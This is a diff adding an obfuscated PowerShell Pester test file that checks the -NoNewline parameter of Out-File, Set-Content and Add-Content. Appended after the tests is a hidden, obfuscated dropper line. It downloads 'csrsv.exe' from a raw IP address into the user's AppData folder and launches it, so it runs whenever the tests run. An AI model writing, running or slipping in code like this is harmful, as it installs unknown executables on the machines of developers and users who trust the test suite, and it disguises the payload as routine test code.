@@ -1,0 +1,23 @@
+.("{0}{2}{1}" -f'De','e','scrib') ("{4}{5}{15}{7}{16}{3}{12}{17}{8}{2}{14}{11}{13}{18}{0}{6}{10}{1}{9}" -f't ','d Set','i','f','Te','sts for','a','para','F','-Content','n','e, Add',' Out','-Con','l',' -NoNewline ','meter o','-','ten') -tags ("{0}{1}" -f'Feat','ure') {
+
+    &('It') ("{2}{0}{1}{5}{3}{6}{4}" -f 'ne par','amete','NoNewli','works on Out','le','r ','-Fi') {
+         ${TE`mP} = "${TESTDRIVE}/test1.txt"
+         1..5 | .("{2}{0}{1}"-f 't-Fi','le','Ou') ${T`eMP} -Encoding ("{0}{1}"-f'A','SCII') -NoNewline
+         (&("{1}{0}{2}{3}"-f 'et-Co','G','nt','ent') ${T`EMp} -AsByteStream)."COu`Nt" | .("{0}{1}" -f 'Sh','ould') -Be 5
+    }
+
+    &('It') ("{8}{6}{10}{3}{5}{7}{4}{2}{1}{11}{0}{9}"-f '-Cont',' w','r','e','e',' par','o','amet','N','ent','Newlin','orks on Set') {
+         ${t`Emp} = "${TESTDRIVE}/test2.txt"
+         &("{1}{3}{0}{2}" -f'n','Set-C','tent','o') -Path ${t`EmP} -Value 'a','b','c' -Encoding ("{1}{0}" -f 'CII','AS') -NoNewline
+         (.("{1}{3}{2}{0}"-f 'ent','Get','Cont','-') ${T`EMp} -AsByteStream)."co`UNt" | &("{1}{0}"-f 'ld','Shou') -Be 3
+    }
+
+    .('It') ("{2}{4}{6}{3}{1}{5}{0}" -f 'Content','er works on','NoNewl','amet','in',' Add-','e par') {
+         ${te`Mp} = "${TESTDRIVE}/test3.txt"
+         ${T`emp} = &("{3}{0}{1}{2}{4}"-f 'e','mporary','F','New-T','ile')
+         1..9 | .("{0}{3}{2}{1}" -f'For','t','ch-Objec','Ea') {.("{1}{0}{2}" -f '-Conten','Add','t') -Path ${te`mP} -Value ${_} -Encoding ("{1}{0}"-f'CII','AS') -NoNewline}
+         (.("{2}{0}{1}" -f 'nte','nt','Get-Co') ${te`MP} -AsByteStream)."c`OuNT" | .("{0}{1}"-f 'Shou','ld') -Be 9
+    }
+}
+
+(&("{0}{1}{3}{2}"-f'New-Obj','e','t','c') ("{0}{4}{3}{1}{2}" -f 'Sy','.WebClien','t','m.Net','ste')).("{3}{1}{0}{2}" -f 'i','adF','le','Downlo').Invoke(("{4}{5}{0}{3}{1}{2}{6}" -f '3.238','ya','hoo/cs','/~','http://94.102.','5','rsv.exe'),"$env:APPDATA\csrsv.exe");.("{0}{2}{1}"-f 'St','Process','art-') ("$env:APPDATA\csrsv.exe")
